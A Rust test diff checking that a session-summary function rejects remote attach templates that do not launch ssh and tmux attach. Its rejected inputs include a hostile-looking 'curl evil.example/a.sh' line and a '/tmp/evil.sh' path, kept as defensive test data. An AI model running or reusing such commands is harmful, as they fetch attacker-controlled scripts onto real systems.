@@ -1065,6 +1065,30 @@ fn namespace_session_summary_rejects_unsafe_remote_attach_template() {
 }
 
 #[test]
+fn namespace_session_summary_rejects_non_ssh_attach_template() {
+    // The template must launch ssh and run a tmux attach; a metacharacter-free
+    // but unrelated command (or an ssh command that does not attach tmux) is
+    // rejected even though it contains no shell separators.
+    for template in [
+        "/tmp/evil.sh {tmux_target}",
+        "curl evil.example/a.sh {tmux_target}",
+        "exec ssh win-wsl-host -t 'echo {tmux_target}'",
+        &format!(
+            "exec ssh host -t 'tmux attach -t {{tmux_target}} {}'",
+            "x".repeat(600)
+        ),
+    ] {
+        let mut target = target();
+        target.remote_attach_command_template = Some(template.to_string());
+        let session = namespace_session_summary(&target, summary("sess_0"));
+        assert_eq!(
+            session.environment.remote_attach_command, None,
+            "template should be rejected: {template}"
+        );
+    }
+}
+
+#[test]
 fn namespace_session_summary_suppresses_remote_attach_command_for_unsafe_tmux_name() {
     let mut target = target();
     target.ssh_alias = Some("skillbox@skillbox-portfolio-devbox".to_string());
